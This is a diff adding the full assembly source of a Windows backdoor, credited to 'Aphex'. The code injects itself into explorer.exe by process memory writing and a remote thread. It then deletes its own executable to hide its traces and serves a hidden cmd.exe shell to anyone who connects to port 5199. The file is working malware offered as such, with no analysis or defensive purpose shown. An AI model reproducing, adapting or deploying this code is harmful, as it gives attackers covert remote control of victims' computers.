@@ -1,0 +1,173 @@
+
+;Tiny NT Backdoor by Aphex
+;http://www.iamaphex.cjb.net
+;unremote@knology.net
+
+;When this EXE is ran it will create a thread
+;inside of explorer.exe that listens on port 5199
+;for connections. Then the EXE deletes itself
+;leaving no traces.
+
+;Each new connection is redirected to a spawned
+;cmd.exe process until the next reboot.
+
+;linker options: /base:0x13140000 /filealign:0x200 /merge:.data=.text /section:.text,RWX /subsystem:windows /libpath:\masm32\lib backdoor.obj
+
+.386
+.model flat,stdcall
+option casemap:none
+include \masm32\include\windows.inc
+include \masm32\include\kernel32.inc
+includelib \masm32\lib\kernel32.lib
+include \masm32\include\user32.inc
+includelib \masm32\lib\user32.lib
+include \masm32\include\wsock32.inc
+includelib \masm32\lib\wsock32.lib
+
+.data
+szTarget byte 'Shell_TrayWnd', 0
+szUser32 byte 'user32.dll', 0
+szWinsock byte 'wsock32.dll', 0
+szCommandLine byte 'cmd.exe', 0
+szSharedData byte 261 dup (0)
+
+.data?
+hModule dword ?
+hNewModule dword ?
+hProcess dword ?
+dwSize dword ?
+dwPid dword ?
+dwBytesWritten dword ?
+dwTid dword ?
+WSAData WSADATA <>
+
+.code
+ShellClient proc dwSock:dword
+local sat:SECURITY_ATTRIBUTES 
+local hiRead:dword
+local hoRead:dword
+local hiWrite:dword
+local hoWrite:dword
+local startupinfo:STARTUPINFO 
+local processinfo:PROCESS_INFORMATION 
+local exitcode:dword
+local buffer[1024]:byte 
+local bytes:dword 
+local available:dword
+local data:dword
+mov sat.nLength, sizeof SECURITY_ATTRIBUTES 
+mov sat.lpSecurityDescriptor, 0 
+mov sat.bInheritHandle, TRUE 
+invoke CreatePipe, addr hiRead, addr hiWrite, addr sat, 0 
+invoke CreatePipe, addr hoRead, addr hoWrite, addr sat, 0 
+invoke GetStartupInfo, addr startupinfo
+mov startupinfo.cb, sizeof STARTUPINFO 
+mov eax, hoWrite
+mov startupinfo.hStdOutput, eax
+mov startupinfo.hStdError, eax
+mov eax, hiRead
+mov startupinfo.hStdInput, eax
+mov startupinfo.dwFlags, STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES 
+mov startupinfo.wShowWindow, SW_HIDE 
+invoke CreateProcess, 0, addr szCommandLine, 0, 0, TRUE, CREATE_NEW_CONSOLE, 0, 0, addr startupinfo, addr processinfo
+invoke CloseHandle, hoWrite
+invoke CloseHandle, hiRead
+mov bytes, 1
+invoke ioctlsocket, dwSock, FIONBIO, addr bytes
+.while TRUE
+  invoke Sleep, 1
+  invoke GetExitCodeProcess, processinfo.hProcess, addr exitcode
+  .if exitcode != STILL_ACTIVE
+    .break
+  .endif
+  invoke PeekNamedPipe, hoRead, addr buffer, 1024, addr bytes, addr available, 0
+  .if bytes != 0
+    .if available > 1024
+      .while bytes >= 1024
+        invoke Sleep, 1
+        invoke ReadFile, hoRead, addr buffer, 1024, addr bytes, 0
+        .if bytes != 0
+          invoke send, dwSock, addr buffer, bytes, 0
+        .endif
+      .endw  
+    .else
+      invoke ReadFile, hoRead, addr buffer, 1024, addr bytes, 0
+      .if bytes != 0
+        invoke send, dwSock, addr buffer, bytes, 0
+      .endif
+    .endif    
+  .endif  
+  invoke recv, dwSock, addr buffer, 1024, 0
+  .if eax == SOCKET_ERROR || eax == 0
+    invoke WSAGetLastError
+    .if eax == WSAEWOULDBLOCK
+      .continue
+    .else
+      invoke TerminateProcess, processinfo.hProcess, 0
+      .break
+    .endif  
+  .else
+    mov edx, eax
+    invoke WriteFile, hiWrite, addr buffer, edx, addr bytes, 0
+  .endif
+.endw
+invoke CloseHandle, hiWrite 
+invoke CloseHandle, hoRead 
+invoke closesocket, dwSock
+ret 
+ShellClient endp 
+
+Shelld proc
+local SockAddrIn:sockaddr_in
+local dwSock:dword
+local dwMode:dword
+invoke DeleteFile, addr szSharedData
+invoke LoadLibrary, addr szUser32
+invoke LoadLibrary, addr szWinsock
+invoke WSAStartup, 101h, addr WSAData
+invoke socket, PF_INET, SOCK_STREAM, 0
+mov dwSock, eax
+mov SockAddrIn.sin_family, AF_INET
+invoke htons, 5199
+mov SockAddrIn.sin_port, ax
+mov SockAddrIn.sin_addr, INADDR_ANY
+invoke bind, dwSock, addr SockAddrIn, sizeof SockAddrIn
+mov dwMode, 1
+invoke ioctlsocket, dwSock, FIONBIO, addr dwMode
+invoke listen, dwSock, SOMAXCONN
+@@:
+invoke accept, dwSock, addr SockAddrIn, 0
+.if eax != INVALID_SOCKET
+  mov edx, eax
+  invoke CreateThread, 0, 0, addr ShellClient, edx, 0, 0
+  invoke CloseHandle, eax
+.endif
+invoke Sleep, 1000
+jmp @B
+ret
+Shelld endp
+
+start:
+invoke GetModuleHandle, 0
+mov hModule, eax
+mov edi, eax 
+assume edi:ptr IMAGE_DOS_HEADER 
+add edi, [edi].e_lfanew
+add edi, sizeof dword
+add edi, sizeof IMAGE_FILE_HEADER
+assume edi:ptr IMAGE_OPTIONAL_HEADER32 
+mov eax, [edi].SizeOfImage
+mov dwSize, eax
+assume edi:NOTHING
+invoke GetModuleFileName, 0, addr szSharedData, 261
+invoke FindWindow, addr szTarget, 0
+invoke GetWindowThreadProcessId, eax, addr dwPid
+invoke OpenProcess, PROCESS_ALL_ACCESS, FALSE, dwPid
+mov hProcess, eax
+invoke VirtualFreeEx, hProcess, hModule, 0, MEM_RELEASE
+invoke VirtualAllocEx, hProcess, hModule, dwSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE 
+mov hNewModule, eax
+invoke WriteProcessMemory, hProcess, hNewModule, hModule, dwSize, addr dwBytesWritten
+invoke CreateRemoteThread, hProcess, 0, 0, addr Shelld, hModule, 0, addr dwTid
+invoke ExitProcess, 0
+end start
